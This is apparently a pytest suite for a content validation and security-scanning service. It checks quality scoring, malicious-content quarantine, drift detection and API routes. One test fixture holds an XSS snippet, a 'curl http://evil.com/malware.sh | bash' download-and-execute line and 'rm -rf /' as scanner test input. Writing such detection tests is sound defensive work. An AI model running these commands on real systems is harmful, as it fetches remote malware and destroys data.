# ABOUTME: Comprehensive test suite for Source Validation & Verification System
# ABOUTME: Tests validation accuracy, security scanning, performance, and compliance requirements

import pytest
import asyncio
import json
import uuid
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch
from typing import Dict, Any, List

from fastapi.testclient import TestClient
from httpx import AsyncClient
import asyncpg

from services.source_validation_service import (
    SourceValidationService, ValidationResult, ValidationStatus, 
    CredibilityLevel, MLValidationModel, SecurityScanner
)
from services.validation_monitoring_service import (
    ValidationMonitoringService, PatternDriftDetector, MonitoringAlert, AlertSeverity
)
from models.knowledge import KnowledgeItem
from core.database import DatabaseManager

# Test data
SAMPLE_KNOWLEDGE_ITEMS = [
    {
        "id": str(uuid.uuid4()),
        "title": "How to use Docker containers effectively",
        "content": """
        Docker containers are lightweight, portable packages that include everything needed to run an application.
        
        Key benefits:
        - Consistency across environments
        - Resource efficiency
        - Easy scalability
        
        Basic commands:
        ```bash
        docker run -d --name myapp nginx
        docker ps
        docker stop myapp
        ```
        """,
        "source_type": "stackoverflow",
        "metadata": {
            "score": 25,
            "is_accepted": True,
            "tags": ["docker", "containers", "devops"]
        }
    },
    {
        "id": str(uuid.uuid4()),
        "title": "SQL Injection Prevention",
        "content": """
        SQL injection is a critical security vulnerability. Always use parameterized queries.
        
        Vulnerable code:
        ```sql
        SELECT * FROM users WHERE id = '" + user_id + "'
        ```
        
        Secure code:
        ```sql
        SELECT * FROM users WHERE id = ?
        ```
        """,
        "source_type": "owasp",
        "metadata": {
            "severity": "high",
            "category": "injection"
        }
    },
    {
        "id": str(uuid.uuid4()),
        "title": "Malicious Script Example",
        "content": """
        <script>alert('XSS');</script>
        
        This content contains malicious JavaScript that could execute in a browser.
        It also includes suspicious patterns like:
        - document.cookie access
        - eval() function calls
        - Remote code execution attempts
        
        ```bash
        curl http://evil.com/malware.sh | bash
        rm -rf /
        ```
        """,
        "source_type": "unknown",
        "metadata": {
            "suspicious": True
        }
    }
]

class TestMLValidationModel:
    """Test ML validation model functionality"""
    
    @pytest.fixture
    def ml_model(self):
        return MLValidationModel()
    
    @pytest.mark.asyncio
    async def test_validate_content_accuracy_high_quality(self, ml_model):
        """Test validation of high-quality technical content"""
        content = SAMPLE_KNOWLEDGE_ITEMS[0]["content"]
        metadata = SAMPLE_KNOWLEDGE_ITEMS[0]["metadata"]
        
        accuracy, confidence = await ml_model.validate_content_accuracy(content, metadata)
        
        # High-quality content should score well
        assert accuracy > 0.7, f"Expected accuracy > 0.7, got {accuracy}"
        assert confidence > 0.6, f"Expected confidence > 0.6, got {confidence}"
    
    @pytest.mark.asyncio
    async def test_validate_content_accuracy_security_content(self, ml_model):
        """Test validation of security-related content"""
        content = SAMPLE_KNOWLEDGE_ITEMS[1]["content"]
        metadata = SAMPLE_KNOWLEDGE_ITEMS[1]["metadata"]
        
        accuracy, confidence = await ml_model.validate_content_accuracy(content, metadata)
        
        # Security content from OWASP should score highly
        assert accuracy > 0.8, f"Expected accuracy > 0.8, got {accuracy}"
        assert confidence > 0.7, f"Expected confidence > 0.7, got {confidence}"
    
    @pytest.mark.asyncio
    async def test_validate_content_structure_analysis(self, ml_model):
        """Test content structure analysis"""
        # Good structure with code blocks and explanations
        good_content = SAMPLE_KNOWLEDGE_ITEMS[0]["content"]
        good_score = await ml_model._analyze_content_structure(good_content)
        
        # Poor structure - just a single line
        poor_content = "This is just one line."
        poor_score = await ml_model._analyze_content_structure(poor_content)
        
        assert good_score > poor_score, "Good structure should score higher than poor structure"
        assert good_score > 0.5, "Good content should score above baseline"
    
    @pytest.mark.asyncio
    async def test_assess_technical_accuracy(self, ml_model):
        """Test technical accuracy assessment"""
        technical_content = SAMPLE_KNOWLEDGE_ITEMS[0]["content"]
        metadata = SAMPLE_KNOWLEDGE_ITEMS[0]["metadata"]
        
        accuracy_score = await ml_model._assess_technical_accuracy(technical_content, metadata)
        
        # Technical content with code examples should score well
        assert accuracy_score > 0.6, f"Expected technical accuracy > 0.6, got {accuracy_score}"

class TestSecurityScanner:
    """Test security scanner functionality"""
    
    @pytest.fixture
    def security_scanner(self):
        return SecurityScanner()
    
    @pytest.mark.asyncio
    async def test_scan_safe_content(self, security_scanner):
        """Test scanning of safe content"""
        safe_content = SAMPLE_KNOWLEDGE_ITEMS[0]["content"]
        metadata = SAMPLE_KNOWLEDGE_ITEMS[0]["metadata"]
        
        result = await security_scanner.scan_content(safe_content, metadata)
        
        assert result.is_safe == True, "Safe content should pass security scan"
        assert result.risk_level in ["low", "medium"], f"Expected low/medium risk, got {result.risk_level}"
        assert len(result.threats_detected) == 0, "Safe content should have no detected threats"
    
    @pytest.mark.asyncio
    async def test_scan_malicious_content(self, security_scanner):
        """Test scanning of malicious content"""
        malicious_content = SAMPLE_KNOWLEDGE_ITEMS[2]["content"]
        metadata = SAMPLE_KNOWLEDGE_ITEMS[2]["metadata"]
        
        result = await security_scanner.scan_content(malicious_content, metadata)
        
        assert result.is_safe == False, "Malicious content should fail security scan"
        assert result.risk_level in ["high", "critical"], f"Expected high/critical risk, got {result.risk_level}"
        assert len(result.threats_detected) > 0, "Malicious content should have detected threats"
    
    @pytest.mark.asyncio
    async def test_url_validation(self, security_scanner):
        """Test URL safety validation"""
        # Safe URLs
        safe_urls = [
            "https://github.com/example/repo",
            "https://stackoverflow.com/questions/123",
            "https://docs.kubernetes.io/concepts/"
        ]
        
        for url in safe_urls:
            is_safe = await security_scanner._validate_url_safety(url)
            assert is_safe == True, f"Safe URL should pass validation: {url}"
    
    def test_calculate_entropy(self, security_scanner):
        """Test entropy calculation for obfuscation detection"""
        # Low entropy (normal text)
        normal_text = "This is a normal sentence with regular words."
        normal_entropy = security_scanner._calculate_entropy(normal_text)
        
        # High entropy (random-looking string)
        random_text = "aB3$kL9@mN7*pQ2#rS5%tU8&vW1!xY4^zA6"
        random_entropy = security_scanner._calculate_entropy(random_text)
        
        assert random_entropy > normal_entropy, "Random text should have higher entropy"
        assert normal_entropy < 6.0, "Normal text should have reasonable entropy"
        assert random_entropy > 4.0, "Random text should have high entropy"

class TestSourceValidationService:
    """Test main validation service functionality"""
    
    @pytest.fixture
    async def mock_db_manager(self):
        """Mock database manager"""
        db_manager = Mock(spec=DatabaseManager)
        
        # Mock connection pool
        mock_pool = Mock()
        mock_conn = Mock()
        mock_conn.fetchrow = AsyncMock()
        mock_conn.execute = AsyncMock()
        mock_conn.fetch = AsyncMock()
        
        # Setup acquire context manager
        acquire_context = Mock()
        acquire_context.__aenter__ = AsyncMock(return_value=mock_conn)
        acquire_context.__aexit__ = AsyncMock(return_value=None)
        mock_pool.acquire.return_value = acquire_context
        
        db_manager.get_postgres_pool.return_value = mock_pool
        
        return db_manager
    
    @pytest.fixture
    def mock_vector_service(self):
        """Mock vector service"""
        vector_service = Mock()
        vector_service.generate_embedding = AsyncMock(return_value=[0.1, 0.2, 0.3])
        vector_service.search_similar = AsyncMock(return_value=[])
        return vector_service
    
    @pytest.fixture
    async def validation_service(self, mock_db_manager, mock_vector_service):
        """Create validation service with mocked dependencies"""
        return SourceValidationService(mock_db_manager, mock_vector_service)
    
    @pytest.mark.asyncio
    async def test_validate_knowledge_item_high_quality(self, validation_service):
        """Test validation of high-quality knowledge item"""
        # Create knowledge item
        item_data = SAMPLE_KNOWLEDGE_ITEMS[0]
        item = KnowledgeItem(
            id=uuid.UUID(item_data["id"]),
            title=item_data["title"],
            content=item_data["content"],
            knowledge_type="pattern",
            source_type=item_data["source_type"],
            source_url="https://stackoverflow.com/questions/123",
            tags=item_data["metadata"].get("tags", []),
            summary="Docker containers guide",
            confidence="high",
            metadata=item_data["metadata"],
            created_at=datetime.utcnow()
        )
        
        # Mock source credibility
        with patch.object(validation_service, '_get_source_credibility') as mock_cred:
            from services.source_validation_service import SourceCredibility
            mock_cred.return_value = SourceCredibility(
                source_name="stackoverflow",
                base_credibility=0.8,
                historical_accuracy=0.75,
                community_validation=0.85,
                reputation_score=0.8,
                last_updated=datetime.utcnow()
            )
            
            result = await validation_service.validate_knowledge_item(item)
        
        # Assertions
        assert isinstance(result, ValidationResult)
        assert result.status in [ValidationStatus.VALIDATED, ValidationStatus.PENDING]
        assert result.credibility_score > 0.6, f"Expected credibility > 0.6, got {result.credibility_score}"
        assert result.accuracy_score > 0.6, f"Expected accuracy > 0.6, got {result.accuracy_score}"
        assert result.security_score > 0.8, f"Expected security > 0.8, got {result.security_score}"
        assert result.validation_time > 0, "Validation should take measurable time"
    
    @pytest.mark.asyncio
    async def test_validate_knowledge_item_malicious_content(self, validation_service):
        """Test validation of malicious content"""
        # Create malicious knowledge item
        item_data = SAMPLE_KNOWLEDGE_ITEMS[2]
        item = KnowledgeItem(
            id=uuid.UUID(item_data["id"]),
            title=item_data["title"],
            content=item_data["content"],
            knowledge_type="pattern",
            source_type=item_data["source_type"],
            source_url="https://unknown.com/malicious",
            tags=[],
            summary="Malicious content example",
            confidence="low",
            metadata=item_data["metadata"],
            created_at=datetime.utcnow()
        )
        
        # Mock source credibility for unknown source
        with patch.object(validation_service, '_get_source_credibility') as mock_cred:
            from services.source_validation_service import SourceCredibility
            mock_cred.return_value = SourceCredibility(
                source_name="unknown",
                base_credibility=0.5,
                historical_accuracy=0.5,
                community_validation=0.5,
                reputation_score=0.5,
                last_updated=datetime.utcnow()
            )
            
            result = await validation_service.validate_knowledge_item(item)
        
        # Assertions
        assert result.status == ValidationStatus.QUARANTINED, "Malicious content should be quarantined"
        assert result.security_score == 0.0, "Malicious content should have zero security score"
        assert len(result.issues) > 0, "Malicious content should have security issues"
        
        # Check for security issue
        security_issues = [issue for issue in result.issues if issue.get("type") == "security"]
        assert len(security_issues) > 0, "Should have at least one security issue"
    
    @pytest.mark.asyncio
    async def test_performance_requirements(self, validation_service):
        """Test that validation meets performance requirements"""
        # Create simple knowledge item for performance testing
        item = KnowledgeItem(
            id=uuid.uuid4(),
            title="Performance Test Item",
            content="Simple content for performance testing.",
            knowledge_type="pattern",
            source_type="test",
            source_url="https://test.com",
            tags=[],
            summary="Performance test",
            confidence="medium",
            metadata={},
            created_at=datetime.utcnow()
        )
        
        # Mock dependencies for fast execution
        with patch.object(validation_service, '_get_source_credibility') as mock_cred:
            from services.source_validation_service import SourceCredibility
            mock_cred.return_value = SourceCredibility(
                source_name="test",
                base_credibility=0.5,
                historical_accuracy=0.5,
                community_validation=0.5,
                reputation_score=0.5,
                last_updated=datetime.utcnow()
            )
            
            start_time = datetime.utcnow()
            result = await validation_service.validate_knowledge_item(item)
            end_time = datetime.utcnow()
            
            elapsed_time = (end_time - start_time).total_seconds()
        
        # Performance requirement: <500ms validation latency
        assert elapsed_time < 0.5, f"Validation took {elapsed_time}s, requirement is <0.5s"
        assert result.validation_time < 0.5, f"Reported validation time {result.validation_time}s exceeds requirement"

class TestPatternDriftDetector:
    """Test pattern drift detection functionality"""
    
    @pytest.fixture
    def drift_detector(self):
        return PatternDriftDetector(window_size=50, drift_threshold=0.2)
    
    def test_baseline_establishment(self, drift_detector):
        """Test establishment of baseline metrics"""
        from services.validation_monitoring_service import ValidationMetrics
        
        # Create initial metrics
        metrics = ValidationMetrics(
            timestamp=datetime.utcnow(),
            source_name="test_source",
            validation_count=100,
            success_count=95,
            failure_count=5,
            quarantine_count=0,
            avg_latency=0.3,
            avg_quality_score=0.8,
            avg_credibility_score=0.7,
            security_threats=0,
            error_count=0
        )
        
        # First call should establish baseline
        result = asyncio.run(drift_detector.detect_drift("test_source", metrics))
        assert result is None, "First metrics should establish baseline, not trigger alert"
        
        # Check baseline was established
        assert "test_source" in drift_detector.baseline_metrics
        baseline = drift_detector.baseline_metrics["test_source"]
        assert baseline["success_rate"] == 0.95
        assert baseline["quality_score"] == 0.8
        assert baseline["latency"] == 0.3

class TestValidationMonitoringService:
    """Test validation monitoring service"""
    
    @pytest.fixture
    async def mock_db_manager(self):
        """Mock database manager for monitoring"""
        db_manager = Mock(spec=DatabaseManager)
        
        # Mock connection pool with sample data
        mock_pool = Mock()
        mock_conn = Mock()
        
        # Mock fetch method to return sample validation metrics
        mock_conn.fetch = AsyncMock(return_value=[
            {
                'source_name': 'stackoverflow',
                'validation_count': 100,
                'success_count': 95,
                'failure_count': 5,
                'quarantine_count': 0,
                'avg_latency': 0.3,
                'avg_quality_score': 0.8,
                'avg_credibility_score': 0.75,
                'security_threats': 0
            }
        ])
        
        mock_conn.execute = AsyncMock()
        
        # Setup acquire context manager
        acquire_context = Mock()
        acquire_context.__aenter__ = AsyncMock(return_value=mock_conn)
        acquire_context.__aexit__ = AsyncMock(return_value=None)
        mock_pool.acquire.return_value = acquire_context
        
        db_manager.get_postgres_pool.return_value = mock_pool
        
        return db_manager
    
    @pytest.fixture
    async def monitoring_service(self, mock_db_manager):
        """Create monitoring service with mocked dependencies"""
        return ValidationMonitoringService(mock_db_manager)
    
    @pytest.mark.asyncio
    async def test_collect_validation_metrics(self, monitoring_service):
        """Test metrics collection from database"""
        await monitoring_service._collect_validation_metrics()
        
        # Check that metrics were collected
        assert len(monitoring_service.metrics_buffer) > 0, "Metrics should be collected"
        
        # Check specific source metrics
        if 'stackoverflow' in monitoring_service.metrics_buffer:
            metrics = monitoring_service.metrics_buffer['stackoverflow'][-1]
            assert metrics.validation_count == 100
            assert metrics.success_count == 95
            assert metrics.avg_latency == 0.3
    
    @pytest.mark.asyncio
    async def test_alert_evaluation(self, monitoring_service):
        """Test alert evaluation logic"""
        from services.validation_monitoring_service import ValidationMetrics
        
        # Add metrics that should trigger an alert (high latency)
        high_latency_metrics = ValidationMetrics(
            timestamp=datetime.utcnow(),
            source_name="test_source",
            validation_count=10,
            success_count=8,
            failure_count=2,
            quarantine_count=0,
            avg_latency=1.5,  # High latency should trigger alert
            avg_quality_score=0.7,
            avg_credibility_score=0.6,
            security_threats=0,
            error_count=0
        )
        
        # Add multiple metrics to meet minimum sample requirement
        for _ in range(15):
            monitoring_service.metrics_buffer["test_source"].append(high_latency_metrics)
        
        # Evaluate alerts
        await monitoring_service._evaluate_alert_conditions()
        
        # Check if any alerts were generated (would be stored in active_alerts)
        # This is hard to test without mocking the alert handling, but we can verify the logic doesn't crash

class TestAPIEndpoints:
    """Test API endpoint functionality"""
    
    def test_validate_items_endpoint_structure(self):
        """Test that validation endpoints have correct structure"""
        # Import the router to test endpoint definitions
        from api.source_validation import router
        
        # Get all routes
        routes = [route.path for route in router.routes]
        
        # Check required endpoints exist
        required_endpoints = [
            "/validate",
            "/validate/bulk", 
            "/statistics",
            "/credibility/{source_name}",
            "/credibility",
            "/alerts",
            "/health",
            "/compliance/audit-log",
            "/stream/validation-events"
        ]
        
        for endpoint in required_endpoints:
            # Check if any route matches (accounting for prefix)
            endpoint_exists = any(endpoint.replace("{source_name}", "") in route for route in routes)
            assert endpoint_exists, f"Required endpoint not found: {endpoint}"

class TestComplianceRequirements:
    """Test GDPR and SOC2 compliance requirements"""
    
    @pytest.mark.asyncio
    async def test_audit_log_creation(self):
        """Test that audit logs are created for compliance"""
        # This would test that validation operations create appropriate audit entries
        # Mock database to verify audit log entries are created
        pass
    
    @pytest.mark.asyncio
    async def test_data_retention_policies(self):
        """Test that data retention policies are properly implemented"""
        # This would test that data retention policies are applied correctly
        # and that data is cleaned up according to compliance requirements
        pass
    
    def test_gdpr_compliance_fields(self):
        """Test that GDPR compliance fields are present in audit logs"""
        # Check that the database schema includes required GDPR fields
        # This would typically be tested by checking the actual database schema
        pass

# Performance and stress tests
class TestPerformanceRequirements:
    """Test enterprise performance requirements"""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_validation_latency_requirement(self):
        """Test that validation meets <500ms latency requirement"""
        # This would create multiple validation tasks and measure latency
        # Requirement: 99.5% of validations complete in <500ms
        pass
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_accuracy_requirement(self):
        """Test that validation meets 99.5% accuracy requirement"""
        # This would run validation against a test dataset with known results
        # Requirement: 99.5% validation accuracy
        pass
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_throughput_requirement(self):
        """Test that system supports 100,000+ validations per hour"""
        # This would test the system's ability to handle high throughput
        # Requirement: Support for 100,000+ validations per hour
        pass

if __name__ == "__main__":
    # Run specific test categories
    import sys
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "performance":
            pytest.main(["-v", "-m", "performance", __file__])
        elif sys.argv[1] == "security":
            pytest.main(["-v", "-k", "security", __file__])
        else:
            pytest.main(["-v", __file__])
    else:
        pytest.main(["-v", __file__])